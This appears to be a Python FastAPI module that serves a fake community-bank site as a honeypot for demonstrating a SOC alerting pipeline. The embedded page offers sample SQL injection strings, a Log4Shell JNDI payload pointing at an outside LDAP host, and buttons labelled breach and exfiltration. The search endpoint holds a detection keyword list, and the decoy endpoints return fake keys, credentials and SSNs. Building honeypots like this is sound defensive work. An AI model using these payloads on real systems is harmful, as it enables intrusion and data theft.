"""First Heritage Community Bank — Interactive Retail Banking Honeypot & Decoy Gateway.

Provides a realistic local community bank website for red team demonstrations, complete with:
- Public banking homepage & customer login portal
- Authenticated customer dashboard (checking, savings, transactions, transfers)
- Simulated normal user traffic endpoints (benign telemetry filtered into IGNORE policy tier)
- Vulnerable search & transfer endpoints triggering exploit alerts (ESCALATE policy tier)
- Decoy core banking treasury keys & customer financial database exfiltration honeytokens
"""

from __future__ import annotations

from datetime import UTC, datetime
from typing import Annotated, Any
from uuid import uuid4

from fastapi import APIRouter, Depends, Request, Response
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from pydantic import BaseModel

from terminus.core.ids import AgentId, OrgId, RuleId
from terminus.models import SiemAlert
from terminus.orgs.service import OrganizationService
from terminus.pipeline.runner import PipelineRunner
from terminus.server.deps import get_org_service, get_pipeline_runner

bank_router = APIRouter(prefix="/bank", tags=["Banking Honeypot & Retail Decoy"])


def _get_target_org_id(request: Request, org_service: OrganizationService) -> OrgId:
    """Retrieve target org ID from header or fallback to default bootstrapped org."""
    header_org = request.headers.get("X-Org-ID")
    if header_org:
        return OrgId(header_org)
    all_orgs = org_service.org_store.list_all()
    if all_orgs:
        return all_orgs[0].org_id
    return OrgId("org-default")


BANK_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>First Heritage Community Bank | Personal &amp; Commercial Banking</title>
  <!-- Dev note: Legacy core treasury interface /bank/api/admin/treasury-keys -->
  <!-- Audit ref: Customer DB export available at /bank/api/customers/export -->
  <style>
    :root {
      --navy-900: #0d1e38;
      --navy-800: #132a4e;
      --navy-700: #1b3864;
      --gold-500: #c99834;
      --gold-400: #deb052;
      --gold-100: #faf3e5;
      --green-600: #0f8b50;
      --gray-50: #f7f9fc;
      --gray-100: #eef2f7;
      --gray-200: #dce3ec;
      --gray-600: #576579;
      --gray-900: #1a2332;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    body { background: var(--gray-50); color: var(--gray-900); line-height: 1.5; }
    
    /* Utility Top Bar */
    .top-bar { background: var(--navy-900); color: #94a3b8; font-size: 12px; padding: 6px 24px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.1); }
    .top-bar a { color: #cbd5e1; text-decoration: none; margin-left: 16px; }
    .top-bar a:hover { color: #fff; }
    .fdic-tag { display: inline-flex; align-items: center; gap: 4px; color: var(--gold-400); font-weight: 600; }

    /* Header */
    header { background: #fff; border-bottom: 1px solid var(--gray-200); padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 4px rgba(0,0,0,0.02); }
    .logo { display: flex; align-items: center; gap: 12px; text-decoration: none; }
    .logo-badge { width: 40px; height: 40px; background: linear-gradient(135deg, var(--navy-900), var(--navy-700)); border-radius: 8px; display: flex; align-items: center; justify-content: center; color: var(--gold-400); font-weight: 800; font-size: 20px; border: 1px solid var(--gold-500); }
    .logo-text h1 { font-size: 20px; font-weight: 800; color: var(--navy-900); letter-spacing: -0.5px; }
    .logo-text p { font-size: 11px; color: var(--gray-600); text-transform: uppercase; letter-spacing: 0.5px; }
    nav { display: flex; gap: 24px; }
    nav a { color: var(--navy-800); text-decoration: none; font-weight: 600; font-size: 14px; padding: 8px 0; position: relative; }
    nav a.active { color: var(--gold-500); border-bottom: 2px solid var(--gold-500); }
    .live-soc-badge { background: #ecfdf5; border: 1px solid #a7f3d0; color: #065f46; font-size: 12px; font-weight: 600; padding: 4px 10px; border-radius: 999px; display: flex; align-items: center; gap: 6px; }
    .dot { width: 8px; height: 8px; border-radius: 50%; background: #10b981; animation: pulse 2s infinite; }
    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }

    /* Security Notice */
    .alert-banner { background: #eff6ff; border-bottom: 1px solid #bfdbfe; color: #1e40af; font-size: 13px; padding: 10px 24px; text-align: center; }

    /* Main Container */
    .hero { max-width: 1200px; margin: 32px auto; padding: 0 24px; display: grid; grid-template-columns: 1fr 380px; gap: 32px; align-items: start; }
    
    /* Promo Pitch */
    .pitch { background: linear-gradient(135deg, var(--navy-900), var(--navy-800)); color: #fff; padding: 40px; border-radius: 16px; box-shadow: 0 8px 24px rgba(13,30,56,0.15); position: relative; overflow: hidden; }
    .pitch::after { content: ""; position: absolute; right: -50px; bottom: -50px; width: 220px; height: 220px; background: radial-gradient(circle, rgba(201,152,52,0.15), transparent 70%); border-radius: 50%; pointer-events: none; }
    .pitch .eyebrow { color: var(--gold-400); font-weight: 700; font-size: 12px; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 12px; }
    .pitch h2 { font-size: 32px; font-weight: 800; line-height: 1.2; margin-bottom: 16px; }
    .pitch p { color: #cbd5e1; font-size: 15px; margin-bottom: 24px; line-height: 1.6; }
    .rates-card { background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.12); border-radius: 12px; padding: 20px; display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; text-align: center; margin-bottom: 24px; }
    .rate-item strong { display: block; font-size: 24px; font-weight: 800; color: var(--gold-400); }
    .rate-item span { font-size: 12px; color: #94a3b8; }
    .features-list { list-style: none; display: flex; flex-direction: column; gap: 10px; font-size: 14px; color: #e2e8f0; }
    .features-list li::before { content: "\2713 "; color: var(--gold-400); font-weight: bold; margin-right: 6px; }

    /* Login / Portal Box */
    .portal-box { background: #fff; border: 1px solid var(--gray-200); border-radius: 16px; padding: 32px; box-shadow: 0 8px 24px rgba(0,0,0,0.04); }
    .portal-box h3 { font-size: 20px; font-weight: 700; color: var(--navy-900); margin-bottom: 4px; }
    .portal-box p { font-size: 13px; color: var(--gray-600); margin-bottom: 20px; }
    .tabs { display: flex; border-bottom: 2px solid var(--gray-100); margin-bottom: 20px; }
    .tab { flex: 1; text-align: center; padding: 8px 0; font-size: 13px; font-weight: 600; color: var(--gray-600); cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -2px; }
    .tab.active { color: var(--navy-900); border-bottom-color: var(--navy-900); }
    .form-group { margin-bottom: 16px; }
    .form-group label { display: block; font-size: 12px; font-weight: 600; color: var(--navy-800); margin-bottom: 6px; }
    .form-group input { width: 100%; padding: 10px 14px; border: 1px solid var(--gray-200); border-radius: 8px; font-size: 14px; transition: border-color 0.2s; }
    .form-group input:focus { outline: none; border-color: var(--navy-700); box-shadow: 0 0 0 3px rgba(19,42,78,0.08); }
    .btn { width: 100%; padding: 12px; border-radius: 8px; border: none; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
    .btn-primary { background: var(--navy-900); color: #fff; }
    .btn-primary:hover { background: var(--navy-700); }
    .btn-secondary { background: var(--gold-100); color: var(--navy-900); border: 1px solid var(--gold-400); margin-top: 10px; }
    .btn-secondary:hover { background: #f5ebd5; }
    .helper-text { font-size: 11px; color: var(--gray-600); text-align: center; margin-top: 12px; }
    .helper-text a { color: var(--navy-800); text-decoration: none; font-weight: 600; }

    /* Customer Account Portal (Logged In) */
    .account-view { display: none; }
    .balance-card { background: #f8fafc; border: 1px solid var(--gray-200); border-radius: 12px; padding: 16px; margin-bottom: 16px; }
    .balance-header { display: flex; justify-content: space-between; font-size: 12px; color: var(--gray-600); margin-bottom: 4px; }
    .balance-amount { font-size: 24px; font-weight: 800; color: var(--navy-900); }
    .txn-table { width: 100%; border-collapse: collapse; font-size: 12px; margin-top: 12px; }
    .txn-table th { text-align: left; padding: 6px 0; color: var(--gray-600); border-bottom: 1px solid var(--gray-200); }
    .txn-table td { padding: 8px 0; border-bottom: 1px solid var(--gray-100); }
    .amount-neg { color: #dc2626; font-weight: 600; }
    .amount-pos { color: #16a34a; font-weight: 600; }

    /* Interactive Search & Exploit Tester */
    .sec-tools { max-width: 1200px; margin: 0 auto 40px; padding: 0 24px; }
    .sec-card { background: #fff; border: 1px solid var(--gray-200); border-radius: 16px; padding: 24px; box-shadow: 0 4px 12px rgba(0,0,0,0.03); }
    .sec-card h4 { font-size: 16px; font-weight: 700; color: var(--navy-900); margin-bottom: 8px; display: flex; align-items: center; gap: 8px; }
    .sec-card p { font-size: 13px; color: var(--gray-600); margin-bottom: 16px; }
    .search-row { display: flex; gap: 8px; margin-bottom: 12px; }
    .search-row input { flex: 1; padding: 10px 14px; border: 1px solid var(--gray-200); border-radius: 8px; font-size: 13px; }
    .btn-action { padding: 10px 16px; width: auto; font-size: 13px; border-radius: 8px; }
    .quick-payloads { display: flex; gap: 8px; flex-wrap: wrap; }
    .payload-chip { font-size: 11px; background: var(--gray-100); border: 1px solid var(--gray-200); padding: 4px 8px; border-radius: 6px; cursor: pointer; font-family: monospace; color: var(--navy-800); }
    .payload-chip:hover { background: #fee2e2; border-color: #fca5a5; color: #991b1b; }
    .result-box { margin-top: 12px; padding: 12px; border-radius: 8px; background: #0f172a; color: #38bdf8; font-family: monospace; font-size: 12px; display: none; white-space: pre-wrap; word-break: break-all; }

    /* Footer */
    footer { background: #fff; border-top: 1px solid var(--gray-200); padding: 32px 24px; text-align: center; font-size: 12px; color: var(--gray-600); }
    .footer-links { display: flex; justify-content: center; gap: 20px; margin-bottom: 16px; }
    .footer-links a { color: var(--navy-800); text-decoration: none; }
  </style>
</head>
<body>

  <div class="top-bar">
    <div>
      <span class="fdic-tag">&#9733; Member FDIC</span> &middot; Equal Housing Lender &middot; Routing # <strong>071923481</strong>
    </div>
    <div>
      <span>24/7 Support: (800) 555-0199</span>
      <a href="/bank/locations">Branch &amp; ATM Finder</a>
      <a href="/console/" target="_blank" style="color: var(--gold-400); font-weight: 600;">Open SOC Console &nearr;</a>
    </div>
  </div>

  <header>
    <a href="/bank/" class="logo">
      <div class="logo-badge">FH</div>
      <div class="logo-text">
        <h1>FIRST HERITAGE</h1>
        <p>COMMUNITY BANK &middot; EST. 1924</p>
      </div>
    </a>
    <nav>
      <a href="/bank/" class="active">Personal Banking</a>
      <a href="/bank/business">Small Business</a>
      <a href="/bank/commercial">Commercial Lending</a>
      <a href="/bank/wealth">Wealth Management</a>
    </nav>
    <div class="live-soc-badge">
      <div class="dot"></div>
      <span>Terminus SOC Protected</span>
    </div>
  </header>

  <div class="alert-banner">
    <strong>Security Advisory:</strong> First Heritage Community Bank will never call, text, or email you requesting your Online Banking password, debit card PIN, or full Social Security Number.
  </div>

  <div class="hero">
    
    <!-- Left Pitch Card -->
    <div class="pitch">
      <div class="eyebrow">Local Relationships &middot; Modern Power</div>
      <h2>Banking built on trust, secured by AI defense.</h2>
      <p>Enjoy premier checking, competitive commercial credit lines, and high-yield savings backed by enterprise cybersecurity monitoring.</p>
      
      <div class="rates-card">
        <div class="rate-item">
          <strong>4.35%</strong>
          <span>High-Yield Savings APY</span>
        </div>
        <div class="rate-item">
          <strong>$0</strong>
          <span>Monthly Checking Fees</span>
        </div>
        <div class="rate-item">
          <strong>$250k</strong>
          <span>FDIC Insurance Coverage</span>
        </div>
      </div>

      <ul class="features-list">
        <li>Free instant domestic FedNow &amp; ACH transfers</li>
        <li>Contactless Visa&reg; Debit Cards with zero liability protection</li>
        <li>24/7 Autonomous SOC threat monitoring across all web transactions</li>
      </ul>
    </div>

    <!-- Right Login / Customer Portal Card -->
    <div class="portal-box">
      
      <!-- Login View -->
      <div id="login-view">
        <div class="tabs">
          <div class="tab active" onclick="switchTab(this, 'personal')">Personal Banking</div>
          <div class="tab" onclick="switchTab(this, 'business')">Business Treasury</div>
        </div>
        <h3>Account Login</h3>
        <p>Sign in to manage accounts and transfer funds.</p>

        <form onsubmit="handleLogin(event)">
          <div class="form-group">
            <label>Username / Online ID</label>
            <input type="text" id="username" placeholder="e.g. sarah.jenkins" required />
          </div>
          <div class="form-group">
            <label>Password</label>
            <input type="password" id="password" placeholder="••••••••••••" required />
          </div>
          <button type="submit" class="btn btn-primary" id="login-btn">Sign In to Accounts</button>
          <button type="button" class="btn btn-secondary" onclick="quickFillDemo()">&#9889; Demo Customer Quick-Fill</button>
        </form>
        <div class="helper-text">
          <a href="#">Forgot ID or Password?</a> &middot; <a href="#">Enroll in Online Banking</a>
        </div>
      </div>

      <!-- Authenticated Account View -->
      <div id="account-view" class="account-view">
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
          <div>
            <h3 style="margin-bottom: 0;">Welcome, Sarah</h3>
            <span style="font-size: 11px; color: var(--green-600); font-weight: 600;">&bull; Online Session Active</span>
          </div>
          <button type="button" class="btn btn-secondary" style="margin-top: 0; padding: 4px 10px; font-size: 11px; width: auto;" onclick="handleLogout()">Sign Out</button>
        </div>

        <div class="balance-card">
          <div class="balance-header">
            <span>HERITAGE CHECKING (...4819)</span>
            <span style="color: var(--green-600); font-weight: bold;">AVAILABLE</span>
          </div>
          <div class="balance-amount">$14,821.50</div>
        </div>

        <div class="balance-card" style="margin-bottom: 16px;">
          <div class="balance-header">
            <span>GROWTH HIGH-YIELD SAVINGS (...9021)</span>
            <span style="color: var(--green-600); font-weight: bold;">AVAILABLE</span>
          </div>
          <div class="balance-amount">$42,390.18</div>
        </div>

        <h4 style="font-size: 13px; color: var(--navy-900); margin-bottom: 4px;">Recent Transactions</h4>
        <table class="txn-table">
          <thead>
            <tr><th>Description</th><th style="text-align: right;">Amount</th></tr>
          </thead>
          <tbody>
            <tr><td>Direct Deposit Payroll</td><td class="amount-pos" style="text-align: right;">+$3,420.00</td></tr>
            <tr><td>Whole Foods Market #104</td><td class="amount-neg" style="text-align: right;">-$84.22</td></tr>
            <tr><td>Pacific Gas &amp; Electric</td><td class="amount-neg" style="text-align: right;">-$142.10</td></tr>
            <tr><td>The Daily Bean Roasters</td><td class="amount-neg" style="text-align: right;">-$6.75</td></tr>
          </tbody>
        </table>

        <button type="button" class="btn btn-primary" style="margin-top: 16px;" onclick="simulateTransfer()">&#9889; Execute $250 Quick Transfer</button>
      </div>

    </div>

  </div>

  <!-- Red Team & Exploit Demonstration Panel -->
  <div class="sec-tools">
    <div class="sec-card">
      <h4>
        <span>&#128737;&#65039; Red Team &amp; Decoy Interception Console</span>
        <span style="font-size: 11px; background: #fee2e2; color: #991b1b; padding: 2px 8px; border-radius: 999px; font-weight: 600;">LIVE DEMO INTERCEPTION</span>
      </h4>
      <p>Test adversary vectors against this banking portal. Ingested events trigger the Terminus SOC Policy Engine in real time:</p>

      <div class="search-row">
        <input type="text" id="exploit-input" placeholder="Search branch records, transactions, or inject adversary payloads..." value="' OR '1'='1' --" />
        <button class="btn btn-primary btn-action" onclick="runSearchExploit()">Dispatch Query</button>
      </div>

      <div class="quick-payloads">
        <span style="font-size: 12px; font-weight: 600; color: var(--navy-900); display: flex; align-items: center;">Quick Test Vectors:</span>
        <span class="payload-chip" onclick="setPayload(this.innerText)">' OR 1=1 --</span>
        <span class="payload-chip" onclick="setPayload(this.innerText)">UNION SELECT username, password_hash FROM bank_users --</span>
        <span class="payload-chip" onclick="setPayload(this.innerText)">${jndi:ldap://198.51.100.42:1389/Exploit}</span>
        <span class="payload-chip" onclick="triggerTreasuryDecoy()">&#128680; Breaching Treasury Honeytoken (/bank/api/admin/treasury-keys)</span>
        <span class="payload-chip" onclick="triggerCustomerDecoy()">&#128680; Exfiltrating Decoy PII (/bank/api/customers/export)</span>
      </div>

      <div id="result-box" class="result-box"></div>
    </div>
  </div>

  <footer>
    <div class="footer-links">
      <a href="/bank/privacy">Privacy &amp; Security</a>
      <a href="/bank/disclosures">Electronic Fund Disclosures</a>
      <a href="/bank/terms">Terms of Service</a>
      <a href="/bank/api/admin/treasury-keys" style="color: #cbd5e1;">Admin Treasury Vault (Canary)</a>
      <a href="/bank/api/customers/export" style="color: #cbd5e1;">Customer Archive (Decoy)</a>
    </div>
    <p>&copy; 2026 First Heritage Community Bank, N.A. All rights reserved. Deposits FDIC-insured up to $250,000.</p>
  </footer>

  <script>
    function switchTab(el, type) {
      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      el.classList.add('active');
    }

    function quickFillDemo() {
      document.getElementById('username').value = 'sarah.jenkins';
      document.getElementById('password').value = 'BankPass2026!';
    }

    async function handleLogin(e) {
      e.preventDefault();
      const user = document.getElementById('username').value;
      const pass = document.getElementById('password').value;
      const btn = document.getElementById('login-btn');
      btn.innerText = 'Authenticating...';

      try {
        const res = await fetch('/bank/api/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username: user, password: pass })
        });
        const data = await res.json();
        btn.innerText = 'Sign In to Accounts';

        if (res.ok && data.status === 'success') {
          document.getElementById('login-view').style.display = 'none';
          document.getElementById('account-view').style.display = 'block';
          showResult('Authenticated successfully! Telemetry routed to Terminus SIEM (Classified as IGNORE / Benign User Traffic).');
        } else {
          showResult('Login rejected: ' + (data.detail || 'Invalid credentials') + ' (Logged as TRIAGE anomaly in Terminus).');
        }
      } catch (err) {
        btn.innerText = 'Sign In to Accounts';
        showResult('Network error: ' + err.message);
      }
    }

    function handleLogout() {
      document.getElementById('account-view').style.display = 'none';
      document.getElementById('login-view').style.display = 'block';
    }

    async function simulateTransfer() {
      const res = await fetch('/bank/api/transfer', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ to_account: '9021', amount: 250.00 })
      });
      const data = await res.json();
      showResult('Transfer complete: ' + JSON.stringify(data, null, 2));
    }

    function setPayload(txt) {
      document.getElementById('exploit-input').value = txt;
    }

    async function runSearchExploit() {
      const q = document.getElementById('exploit-input').value;
      showResult('Dispatching query payload to /bank/api/search?q=' + encodeURIComponent(q) + '...');
      const res = await fetch('/bank/api/search?q=' + encodeURIComponent(q));
      const data = await res.json();
      showResult(JSON.stringify(data, null, 2));
    }

    async function triggerTreasuryDecoy() {
      showResult('Breaching Decoy Treasury Key Vault (/bank/api/admin/treasury-keys)...');
      const res = await fetch('/bank/api/admin/treasury-keys');
      const data = await res.json();
      showResult('HONEYTOKEN VAULT BREACHED:\n' + JSON.stringify(data, null, 2));
    }

    async function triggerCustomerDecoy() {
      showResult('Requesting Synthetic Customer Database Export (/bank/api/customers/export)...');
      const res = await fetch('/bank/api/customers/export');
      const data = await res.json();
      showResult('CUSTOMER PII EXFILTRATED:\n' + JSON.stringify(data, null, 2));
    }

    function showResult(txt) {
      const el = document.getElementById('result-box');
      el.style.display = 'block';
      el.innerText = txt;
    }
  </script>
</body>
</html>
"""


@bank_router.get("/", response_class=HTMLResponse)
@bank_router.get("", response_class=HTMLResponse)
async def bank_home() -> HTMLResponse:
    """Render the public First Heritage Community Bank web interface."""
    return HTMLResponse(BANK_HTML, headers={"Cache-Control": "no-cache"})


@bank_router.get("/robots.txt")
async def bank_robots() -> Response:
    """Robots.txt pointing to honeytoken endpoints to bait web crawlers & adversaries."""
    content = (
        "User-agent: *\n"
        "Disallow: /bank/api/admin/\n"
        "Disallow: /bank/api/customers/export\n"
        "# Internal Core Banking Ledger\n"
    )
    return Response(content=content, media_type="text/plain")


class BankLoginRequest(BaseModel):
    username: str
    password: str


@bank_router.post("/api/login")
async def bank_api_login(
    req: BankLoginRequest,
    request: Request,
    pipeline_runner: Annotated[PipelineRunner, Depends(get_pipeline_runner)],
    org_service: Annotated[OrganizationService, Depends(get_org_service)],
) -> dict[str, Any]:
    """Bank customer login endpoint.

    Valid logins emit low-severity benign telemetry (level 2 -> IGNORE policy tier).
    Failed attempts emit suspicious brute-force telemetry (level 7 -> TRIAGE policy tier).
    """
    target_org_id = _get_target_org_id(request, org_service)
    client_ip = request.client.host if request.client else "127.0.0.1"

    is_valid = (
        (req.username.lower() == "sarah.jenkins" and req.password == "BankPass2026!")
        or (req.username.lower() == "customer" and req.password == "password")
    )

    if is_valid:
        # Benign log -> Level 2 -> IGNORE policy tier (zero clutter in SOC queue)
        alert = SiemAlert(
            id=f"bank-auth-{uuid4().hex[:8]}",
            rule_id=RuleId(100010),
            level=2,
            description="Online Banking: Customer Session Successfully Authenticated",
            mitre=None,
            agent_id=AgentId("srv-bank-web01"),
            agent_name="bank-web-frontend-01",
            full_log=f"INFO: Customer '{req.username}' logged into retail web portal from {client_ip}. 2FA token verified.",
            timestamp=datetime.now(UTC).isoformat(),
        )
        await pipeline_runner.process_alert(alert, target_org_id)
        return {
            "status": "success",
            "message": f"Welcome back, {req.username}!",
            "session_id": f"bank-sess-{uuid4().hex[:12]}",
            "user": {"name": "Sarah Jenkins", "customer_id": "CUST-98214-FH"},
        }
    else:
        # Failed login anomaly -> Level 7 -> TRIAGE policy tier
        alert = SiemAlert(
            id=f"bank-auth-fail-{uuid4().hex[:8]}",
            rule_id=RuleId(100015),
            level=7,
            description="Online Banking: Consecutive Failed Authentication Attempts (Brute Force Anomaly)",
            mitre="T1110",
            agent_id=AgentId("srv-bank-web01"),
            agent_name="bank-web-frontend-01",
            full_log=f"WARNING: Authentication failure for user '{req.username}' from {client_ip}. Invalid password hash.",
            timestamp=datetime.now(UTC).isoformat(),
        )
        await pipeline_runner.process_alert(alert, target_org_id)
        return JSONResponse(
            status_code=401,
            content={"status": "error", "detail": "Invalid username or password."},
        )


class BankTransferRequest(BaseModel):
    to_account: str
    amount: float


@bank_router.post("/api/transfer")
async def bank_api_transfer(
    req: BankTransferRequest,
    request: Request,
    pipeline_runner: Annotated[PipelineRunner, Depends(get_pipeline_runner)],
    org_service: Annotated[OrganizationService, Depends(get_org_service)],
) -> dict[str, Any]:
    """Bank account transfer endpoint. Emits standard benign transactional audit telemetry."""
    target_org_id = _get_target_org_id(request, org_service)
    client_ip = request.client.host if request.client else "127.0.0.1"

    alert = SiemAlert(
        id=f"bank-tx-{uuid4().hex[:8]}",
        rule_id=RuleId(100011),
        level=3,
        description="Online Banking: Internal Account Transfer Executed",
        mitre=None,
        agent_id=AgentId("srv-bank-web01"),
        agent_name="bank-web-frontend-01",
        full_log=f"INFO: Internal wire of ${req.amount:.2f} executed to account ...{req.to_account} by customer from {client_ip}.",
        timestamp=datetime.now(UTC).isoformat(),
    )
    await pipeline_runner.process_alert(alert, target_org_id)
    return {
        "status": "success",
        "transfer_id": f"TX-FEDNOW-{uuid4().hex[:8].upper()}",
        "amount": req.amount,
        "fee": 0.00,
        "settlement": "Instant (FedNow Rails)",
    }


@bank_router.get("/api/search")
async def bank_api_search(
    q: str,
    request: Request,
    pipeline_runner: Annotated[PipelineRunner, Depends(get_pipeline_runner)],
    org_service: Annotated[OrganizationService, Depends(get_org_service)],
) -> dict[str, Any]:
    """Search branch records or transactions.

    If SQL Injection or exploit strings are detected, triggers Level 12 ESCALATE alert.
    Otherwise emits Level 2 benign search telemetry.
    """
    target_org_id = _get_target_org_id(request, org_service)
    client_ip = request.client.host if request.client else "127.0.0.1"
    lower_q = q.lower()

    # Exploit / Attack Detection
    is_sqli = any(pat in lower_q for pat in ["' or ", "'1'='1", "union select", "--", "drop table", "information_schema"])
    is_jndi = "${jndi:" in lower_q or "ldap://" in lower_q

    if is_sqli or is_jndi:
        # Critical Exploit Alert -> Level 12 -> ESCALATE policy tier -> AI SOC agent investigation!
        alert = SiemAlert(
            id=f"bank-exploit-{uuid4().hex[:8]}",
            rule_id=RuleId(100030),
            level=12,
            description="Web Application Attack: SQL Injection or RCE Payload Intercepted in Account Search",
            mitre="T1190",
            agent_id=AgentId("srv-bank-web01"),
            agent_name="bank-web-frontend-01",
            full_log=f"ALERT: Malicious payload intercepted in HTTP GET /bank/api/search?q={q} from {client_ip}. Vector: T1190 Initial Access exploit attempt.",
            timestamp=datetime.now(UTC).isoformat(),
        )
        report = await pipeline_runner.process_alert(alert, target_org_id)
        return {
            "status": "blocked",
            "threat_detected": True,
            "mitre_technique": "T1190",
            "action": "INTERCEPTED_BY_TERMINUS_SOC",
            "ticket_created": report.alert_id,
            "message": "Potential SQL Injection / Remote Code Execution attempt detected and intercepted.",
        }
    else:
        # Benign search query -> Level 2 -> IGNORE policy tier
        alert = SiemAlert(
            id=f"bank-search-{uuid4().hex[:8]}",
            rule_id=RuleId(100012),
            level=2,
            description="Online Banking: Standard Branch & Transaction Search Query",
            mitre=None,
            agent_id=AgentId("srv-bank-web01"),
            agent_name="bank-web-frontend-01",
            full_log=f"INFO: Benign query '{q}' evaluated for branch locator from {client_ip}.",
            timestamp=datetime.now(UTC).isoformat(),
        )
        await pipeline_runner.process_alert(alert, target_org_id)
        return {
            "status": "success",
            "query": q,
            "results": [
                {"branch": "Downtown Flagship Branch", "address": "100 Financial Plaza, Suite 100", "distance": "0.4 mi"},
                {"branch": "Westside Community Office", "address": "842 Valley Blvd", "distance": "2.1 mi"},
            ],
        }


@bank_router.get("/api/admin/treasury-keys")
async def get_bank_treasury_keys(
    request: Request,
    pipeline_runner: Annotated[PipelineRunner, Depends(get_pipeline_runner)],
    org_service: Annotated[OrganizationService, Depends(get_org_service)],
) -> dict[str, Any]:
    """Decoy Core Banking Vault & Honeytoken Tripwire.

    Adversaries accessing this endpoint retrieve synthetic FedWire & SWIFT credentials,
    instantly tripping a Level 15 ESCALATE alert on bank-core-ledger-01.
    """
    target_org_id = _get_target_org_id(request, org_service)
    client_ip = request.client.host if request.client else "127.0.0.1"

    alert = SiemAlert(
        id=f"bank-honeytoken-{uuid4().hex[:8]}",
        rule_id=RuleId(100095),
        level=15,
        description="Canary Token Accessed: Decoy Core Banking FedWire & SWIFT Keys Retrieved (T1552)",
        mitre="T1552",
        agent_id=AgentId("srv-bank-core01"),
        agent_name="bank-core-ledger-01",
        full_log=f"HONEYTOKEN TRIPWIRE: Client {client_ip} fetched fake FedWire secret key FEDWIRE_CANARY_TOKEN_9941 and SWIFT clearing keys from /bank/api/admin/treasury-keys",
        timestamp=datetime.now(UTC).isoformat(),
    )
    await pipeline_runner.process_alert(alert, target_org_id)

    return {
        "status": "warning",
        "service": "first-heritage-treasury-core",
        "disclaimer": "SYNTHETIC DECOY DATA FOR RED TEAM INTERCEPTION DEMONSTRATION",
        "treasury_secrets": {
            "fedwire_routing_key": "FEDWIRE_CANARY_TOKEN_9941_REDTEAM",
            "swift_bic_clearing_secret": "FHBCUS33XXX_SEC_TOKEN_CANARY",
            "core_ledger_db_uri": "postgres://ledger_admin:BankSecret2026!@bank-core-db:5432/core_accounts",
            "plaid_master_secret": "plaid_live_canary_honeytoken_synthetic_secret_88",
        },
    }


@bank_router.get("/api/customers/export")
async def export_decoy_customers(
    request: Request,
    pipeline_runner: Annotated[PipelineRunner, Depends(get_pipeline_runner)],
    org_service: Annotated[OrganizationService, Depends(get_org_service)],
) -> dict[str, Any]:
    """Decoy Exfiltration Endpoint exposing synthetic bank customer records with fake SSNs.

    Trips a Level 15 ESCALATE alert on bank-core-ledger-01 for Data Exfiltration.
    """
    target_org_id = _get_target_org_id(request, org_service)
    client_ip = request.client.host if request.client else "127.0.0.1"

    alert = SiemAlert(
        id=f"bank-exfil-{uuid4().hex[:8]}",
        rule_id=RuleId(100096),
        level=15,
        description="Canary Table Read: Synthetic Bank Customer Accounts & SSNs Exfiltrated (T1567)",
        mitre="T1567",
        agent_id=AgentId("srv-bank-core01"),
        agent_name="bank-core-ledger-01",
        full_log=f"HONEYTOKEN TRIPWIRE: Client {client_ip} downloaded decoy customer financial table containing 3 synthetic SSNs and account balances from /bank/api/customers/export",
        timestamp=datetime.now(UTC).isoformat(),
    )
    await pipeline_runner.process_alert(alert, target_org_id)

    return {
        "status": "warning",
        "record_count": 3,
        "disclaimer": "SYNTHETIC DECOY DATA FOR RED TEAM INTERCEPTION DEMONSTRATION",
        "customers": [
            {
                "account_number": "FH-008912-CHECKING",
                "customer_name": "Sarah Jenkins",
                "ssn": "987-65-4321",
                "balance": 14821.50,
                "tier": "Premier Private Banking",
            },
            {
                "account_number": "FH-004419-COMMERCIAL",
                "customer_name": "Marcus Vance",
                "ssn": "987-12-8874",
                "balance": 248900.00,
                "tier": "Commercial Treasury",
            },
            {
                "account_number": "FH-007123-SAVINGS",
                "customer_name": "Elena Rostova",
                "ssn": "987-34-1109",
                "balance": 52100.25,
                "tier": "Growth Savings",
            },
        ],
    }


@bank_router.get("/honeypot", include_in_schema=False)
async def honeypot_redirect() -> RedirectResponse:
    """Redirect /honeypot to /bank/."""
    return RedirectResponse("/bank/")
